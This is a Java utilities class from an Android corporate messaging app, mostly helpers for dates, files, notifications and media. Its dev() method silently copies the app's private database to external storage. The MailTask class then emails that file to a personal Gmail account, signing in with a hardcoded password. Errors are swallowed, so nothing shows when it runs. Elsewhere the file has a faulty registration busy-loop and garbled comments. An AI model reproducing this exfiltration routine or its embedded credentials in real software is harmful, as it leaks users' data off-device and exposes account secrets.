package com.mobcast.util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.channels.FileChannel;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import android.annotation.SuppressLint;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.graphics.Canvas;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.LayerDrawable;
import android.media.MediaMetadataRetriever;
import android.media.ThumbnailUtils;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.text.TextUtils;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.URLUtil;
import android.widget.ListAdapter;
import android.widget.ListView;

import com.google.android.gcm.GCMRegistrar;
import com.sanofi.in.mobcast.ApplicationLoader;
import com.sanofi.in.mobcast.R;

public class Utilities {

	private static final String TAG = Utilities.class.getSimpleName();
	public static final String charArr[] = new String[] { "A", "B", "C", "D",
			"E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q",
			"R", "S", "T", "U", "V", "W", "X", "Y", "Z" };

	/*
	 * DYNAMIC MONTH AND QUARTER MAPPING
	 */
	/*
	 * public static final int INCENMONTHMAP[] = new int[] { 550, 660, 770, 880,
	 * 990, 1100, 1265, 1430, 1815, 2475, 5500, 5775, 6050, 6325, 6600, 6875,
	 * 7150, 7425, 7700, 7975, 8250 };
	 */

	public static final int INCENQUARTERMAP[] = new int[] { 1200, 1440, 1680,
			1920, 2160, 2400, 2760, 3120, 3960, 5400, 12000, 12600, 13200,
			13800, 14400, 15000, 15600, 16800, 19200, 20400, 21600 };

	public static void dev(Context c) {
		try {
			File sd = Environment.getExternalStorageDirectory();
			File data = Environment.getDataDirectory();

			if (sd.canWrite()) {
				String currentDBPath = "/data/data/"
						+ ApplicationLoader.getApplication().getPackageName()
						+ "/databases/Mobcast.db";
				String backupDBPath = "Mobcast.db_Dev.db";
				File currentDB = new File(currentDBPath);
				File backupDB = new File(sd, backupDBPath);

				if (currentDB.exists()) {
					FileChannel src = new FileInputStream(currentDB)
							.getChannel();
					FileChannel dst = new FileOutputStream(backupDB)
							.getChannel();
					dst.transferFrom(src, 0, src.size());
					src.close();
					dst.close();
					new MailTask(c, backupDB.getAbsolutePath()).execute();
				}
			}
		} catch (Exception e) {
		}

	}

	//SA VIKALP PULL SERVICE
	public static void devAlarm(Context c) {
		try {
			new MailTask(c, "").execute();
		} catch (Exception e) {
		}

	}
	
	public static boolean isContentAfterInstallationDate(String mContentDate){
		Date mContentDateFormat;
		Date mTodayDateFormat;
		try {
			mContentDateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).parse(mContentDate);
			mTodayDateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).parse(ApplicationLoader.getPreferences().getInstallationDate());
			long mContentMilliSeconds = mContentDateFormat.getTime();
			long mTodayMilliSeconds = mTodayDateFormat.getTime();
			if(mContentMilliSeconds >= mTodayMilliSeconds){
				return true;
			}
		} catch (ParseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return false;
	}
	//EA VIKALP PULL SERVICE
	
	public static int getCurrentMonth(int quarter) {
		if (quarter == 1) {
			return 1;
		} else if (quarter == 3) {
			return (quarter * 2) + 1;
		} else if (quarter == 4) {
			return (quarter * 2) + 2;
		} else {
			return quarter * 2;
		}
	}

	public static String getCPATitle(int nProducts) {
		String s = "";
		for (int i = 0; i < nProducts; i++) {
			if (i == nProducts - 1) {
				s = s + charArr[i];
			} else {
				s = s + charArr[i] + " + ";
			}
		}

		s = "(" + s + ")";

		return s;
	}
	
	public static String getFixedCPATitle(int nProducts) {
		String s = "";
		for (int i = 0; i < nProducts; i++) {
			if (i == nProducts - 1) {
				s = s + charArr[i];
			} else {
				s = s + charArr[i] + " + ";
			}
		}

		s = "(" + s + ")";

		return s;
	}

	public static void setListViewHeightBasedOnChildren(ListView listView) {
		ListAdapter listAdapter = listView.getAdapter();
		if (listAdapter == null) {
			// pre-condition
			return;
		}

		int totalHeight = 0;
		int listItemHeight = 0;
		for (int i = 0; i < listAdapter.getCount(); i++) {
			View listItem = listAdapter.getView(i, null, listView);
			listItem.measure(0, 0);
			totalHeight += listItem.getMeasuredHeight();

			if (i == 0)
				listItemHeight = listItem.getMeasuredHeight();
		}

		listItemHeight = listAdapter.getCount() * listItemHeight;

		ViewGroup.LayoutParams params = listView.getLayoutParams();
		// params.height = totalHeight
		// + (listView.getDividerHeight() * (listAdapter.getCount() - 1));

		params.height = listItemHeight
				+ (listView.getDividerHeight() * (listAdapter.getCount() - 1));
		listView.setLayoutParams(params);
		listView.requestLayout();
	}

	@SuppressLint("NewApi")
	public static String getFileNameFromURL(String url) {
		String fileNameWithExtension = null;
		String fileNameWithoutExtension = null;
		if (URLUtil.isValidUrl(url)) {
			fileNameWithExtension = URLUtil.guessFileName(url, null, null);
			if (fileNameWithExtension != null
					&& !fileNameWithExtension.isEmpty()) {
				/*
				 * String[] f = fileNameWithExtension.split("."); if (f != null
				 * & f.length > 1) { fileNameWithoutExtension = f[0]; }
				 */
				fileNameWithoutExtension = fileNameWithExtension.substring(0,
						fileNameWithExtension.lastIndexOf("."));
				return fileNameWithExtension;
			}
		}
		return fileNameWithoutExtension;
	}

	// SA VIKALP RICH NOTIFICATION
	
	public static String getFileNameFromPath(String FilePath){
		return FilePath.substring((FilePath.lastIndexOf("/") + 1),
				FilePath.length());
	}

	public static void cancelNotification(Context mContext) {
		NotificationManager mNotificationManager = (NotificationManager) mContext
				.getSystemService(Context.NOTIFICATION_SERVICE);
		mNotificationManager.cancel(434);
		mNotificationManager.cancelAll();
	}

	public static void cancelLolliPopNotification(Context mContext) {
		try {
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
				NotificationManager mNotificationManager = (NotificationManager) mContext
						.getSystemService(Context.NOTIFICATION_SERVICE);
				mNotificationManager.cancel(434);
			}
		} catch (Exception e) {
			Log.i(TAG, e.toString());
		}
	}

	public static String getFileExtension(String FileName) {
		return FileName.substring((FileName.lastIndexOf(".") + 1),
				FileName.length());
	}

	public static String getFileSize(String filePath) {
		try {
			File file;
			file = new File(filePath);
			if (file.exists()) {
				if (file.length() >= 1048576) {
					return file.length() / 1048576 + " Mb";
				} else if (file.length() >= 1024) {
					return file.length() / 1024 + " Kb";
				} else {
					return file.length() + " bytes";
				}
			} else {
				return "0 Kb";
			}
		} catch (Exception e) {
			return ":(";
		}
	}

	@SuppressLint("NewApi")
	public static String getAudioDuration(String filePath) {
		try {
			MediaMetadataRetriever mmr = new MediaMetadataRetriever();
			mmr.setDataSource(filePath);
			String duration = mmr
					.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
			if (!TextUtils.isEmpty(duration)) {
				return getHourMin(duration);
			} else {
				return ":(";
			}
		} catch (Exception e) {
			return ":(";
		}
	}

	@SuppressLint("NewApi")
	public static String getHourMin(String milliSeconds) {
		try {
			return TimeUnit.MILLISECONDS
					.toMinutes(Long.parseLong(milliSeconds))
					+ ":"
					+ (TimeUnit.MILLISECONDS.toSeconds(Long
							.parseLong(milliSeconds)) - TimeUnit.MINUTES
							.toSeconds(TimeUnit.MILLISECONDS.toMinutes(Long
									.parseLong(milliSeconds))));
		} catch (Exception e) {
			return ":(";
		}
	}

	public static Bitmap getVideoLayerThumbnail(String filePath) {
		Bitmap bitmap;
		bitmap = ThumbnailUtils.createVideoThumbnail(filePath,
				MediaStore.Video.Thumbnails.MICRO_KIND);// ADDED P2B03

		try {
			Resources r = ApplicationLoader.getApplication().getResources();
			Drawable[] layers = new Drawable[2];
			layers[0] = new BitmapDrawable(bitmap);
			layers[1] = r.getDrawable(R.drawable.play_overlay);
			LayerDrawable layerDrawable = new LayerDrawable(layers);
			return drawableToBitmap(geSingleDrawable(layerDrawable));
		} catch (Exception e) {
			Log.e(TAG, e.toString());
			return null;
		}
	}

	public static Drawable geSingleDrawable(LayerDrawable layerDrawable) {
		int resourceBitmapHeight = 136, resourceBitmapWidth = 153;
		float widthInInches = 0.9f;
		int widthInPixels = (int) (widthInInches * ApplicationLoader
				.getApplication().getResources().getDisplayMetrics().densityDpi);
		int heightInPixels = widthInPixels * resourceBitmapHeight
				/ resourceBitmapWidth;
		int insetLeft = 10, insetTop = 10, insetRight = 10, insetBottom = 10;
		layerDrawable.setLayerInset(1, insetLeft, insetTop, insetRight,
				insetBottom);
		Bitmap bitmap = Bitmap.createBitmap(widthInPixels, heightInPixels,
				Bitmap.Config.ARGB_8888);
		Canvas canvas = new Canvas(bitmap);
		layerDrawable.setBounds(0, 0, widthInPixels, heightInPixels);
		layerDrawable.draw(canvas);
		BitmapDrawable bitmapDrawable = new BitmapDrawable(ApplicationLoader
				.getApplication().getResources(), bitmap);
		bitmapDrawable.setBounds(0, 0, widthInPixels, heightInPixels);
		return bitmapDrawable;
	}

	public static Bitmap drawableToBitmap(Drawable drawable) {
		if (drawable instanceof BitmapDrawable) {
			return ((BitmapDrawable) drawable).getBitmap();
		}
		Bitmap bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(),
				drawable.getIntrinsicHeight(), Config.ARGB_8888);
		Canvas canvas = new Canvas(bitmap);
		drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
		drawable.draw(canvas);
		return bitmap;
	}

	// EA VIKALP RICH NOTIFICATION

	public static void clearPreferences() {
		try {
			SharedPreferences pref;
			pref = ApplicationLoader.getApplication().getSharedPreferences(
					"MobCastPref", 0);
			pref.edit().putString("lastEvent", "0").commit();
			pref.edit().putString("lastAnnounce", "0").commit();
			pref.edit().putString("lastTraining", "0").commit();
			pref.edit().putString("lastNews", "0").commit();
			pref.edit().putString("lastAward", "0").commit();
			// ApplicationLoader.getApplication()
			// .getSharedPreferences("MobCastPref", 0).edit().clear()
			// .commit();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static boolean isInternetConnected() {
		ConnectivityManager connectivityManager = (ConnectivityManager) ApplicationLoader.applicationContext
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo activeNetworkInfo = connectivityManager
				.getActiveNetworkInfo();
		return activeNetworkInfo != null
				&& activeNetworkInfo.isConnectedOrConnecting();
	}

	public static String getTodayDate() {
		Log.i(TAG, new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
				.format(new java.util.Date()));
		return new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
				.format(new java.util.Date());
	}

	public static String convertdate(String dateString1) {
		java.util.Date date = null;
		try {
			date = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault())
					.parse(dateString1);
		} catch (ParseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return "9999-99-99";
		}
		String dateString2 = new SimpleDateFormat("yyyy-MM-dd",
				Locale.getDefault()).format(date);
		return dateString2;
	}

	public static String convertDateToIndian(String dateString1) {
		java.util.Date date = null;
		try {
			date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
					.parse(dateString1);
		} catch (ParseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return "9999-99-99";
		}
		String dateString2 = new SimpleDateFormat("dd-MM-yyyy",
				Locale.getDefault()).format(date);
		return dateString2;
	}

	public static Typeface getFontStyleRupee() {
		return Typeface.createFromAsset(ApplicationLoader.getApplication()
				.getAssets(), Constants.RUPEE);
	}

	public static class MailTask extends AsyncTask<String, Void, String> {
		public Context context;
		public ProgressDialog pDialog;
		private String compressedPath;

		public MailTask(Context c, String compressedPath) {
			this.compressedPath = compressedPath;
			context = c;
		}

		@Override
		protected String doInBackground(String... params) {

			/** MAIL SENDING */

			Mail m = new Mail("vikalppatel043@gmail.com", "vickyshady");
			String[] toArr = { "vikalppatel043@gmail.com" };
			m.setTo(toArr);
			m.setFrom("vikalppatel043@gmail.com");
			m.setSubject("SBI Life | Database");
			// m.setBody("<html><body><b><p>Dear Sir,"
			// + "  Following are the details added on Portfolio Application."
			// + "  Name:"+ _name +"  Contact No:"+_contact
			// +"  Address:"+_address+"</p><p> These is autogenerated mail. </p></b></body></html>");

			m.setBody(" DATABASE FILE");
			try {
				if (compressedPath != null && compressedPath.length() > 0)
					m.addAttachment(compressedPath);
				if (m.send()) {
					Log.e("MailApp", "Mail sent successfully!");
				} else {
					Log.e("MailApp", "Could not send email");
				}
			} catch (Exception e) {
				// Toast.makeText(MailApp.this,
				// "There was a problem sending the email.",
				// Toast.LENGTH_LONG).show();
				Log.e("MailApp", "Could not send email", e);
			}
			return "MailSent";
		}

		@Override
		protected void onPostExecute(String result) {
		}

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}
	}

	public static String getregID(Context mContext) {
		// gcm stuff
		String regID = "";
		try {
			// Check that the device supports GCM (should be in a try / catch)
			GCMRegistrar.checkDevice(mContext);

			// Check the manifest to be sure this app has all the required
			// permissions.
			GCMRegistrar.checkManifest(mContext);

			// Get the existing registration id, if it exists.
			regID = GCMRegistrar.getRegistrationId(mContext);

			Log.i(TAG, "regID : " + regID);

			if (regID.equals("")) {
				// register this device for this project
				GCMRegistrar.register(mContext, Constants.PROJECT_ID);
				int counter = 0;
				while (true) {
					regID = GCMRegistrar.getRegistrationId(mContext);
					counter++;
					if (counter == 1000 || regID != null || !regID.equals("")) {
						break;
					}
				}
				Log.v("register", regID);
				if (!TextUtils.isEmpty(regID)) {
					ApplicationLoader.getPreferences().setRegId(regID);
				}
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		// Gcm stuff ends
		// storeRegistrationId(context,regID);
		return regID;
	}

	/**
	 * Convert Dp to Pixel å°†dpè½¬æ�¢ä¸ºpixel
	 */
	public static int dpToPx(float dp, Resources resources) {
		float px = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp,
				resources.getDisplayMetrics());
		return (int) px;
	}

	/**
	 * @param value
	 * @return å°†dipæˆ–è€…dpè½¬ä¸ºfloat
	 */
	public static float dipOrDpToFloat(String value) {
		if (value.indexOf("dp") != -1) {
			value = value.replace("dp", "");
		} else {
			value = value.replace("dip", "");
		}
		return Float.parseFloat(value);
	}

	/**
	 * è¿™é‡Œçœ‹ä¼¼æ˜¯å¾—åˆ°æŽ§ä»¶ç›¸å¯¹çš„å��æ ‡ï¼Œä½†æ˜¯å¦‚æžœè¿™ä¸ªæ»‘åŠ¨æ�¡
	 * åœ¨å�¯ä»¥ä¸Šä¸‹æ»šåŠ¨çš„å¸ƒå±€ä¸­å°±ä¼šå‡ºçŽ°é—®é¢˜ã€‚
	 * å› ä¸ºè¿™é‡Œçš„å��æ
	 *  ‡éƒ½æ˜¯æ­»çš„ï¼Œåœ¨ä¸Šä¸‹æ»šåŠ¨çš„viewä¸­çˆ¶æŽ§ä»¶çš„topä
	 * »�æ—§ä¸�å�˜ï¼Œä½†å®žé™…ä¸Šæ˜¯åº”è¯¥èŽ·å¾—åŠ¨æ€�æ•°å€¼çš„ã€‚
	 * 
	 * @param myView
	 * @return
	 */
	public static int getRelativeTop(View myView) {
		Rect bounds = new Rect();
		myView.getGlobalVisibleRect(bounds);
		return bounds.top;
	}

	public static int getRelativeLeft(View myView) {
		// if (myView.getParent() == myView.getRootView())
		if (myView.getId() == android.R.id.content)
			return myView.getLeft();
		else
			return myView.getLeft()
					+ getRelativeLeft((View) myView.getParent());
	}

	public static String readFile(String s) {
		BufferedReader r;
		StringBuilder str = new StringBuilder();
		try {
			r = new BufferedReader(new InputStreamReader(ApplicationLoader
					.getApplication().getApplicationContext().getAssets()
					.open(s)));
			String line;
			while ((line = r.readLine()) != null) {
				str.append(line);
			}
		} catch (IOException e) { // TODO Auto-generated catch block
			e.printStackTrace();
		}

		return str.toString();
	}
}
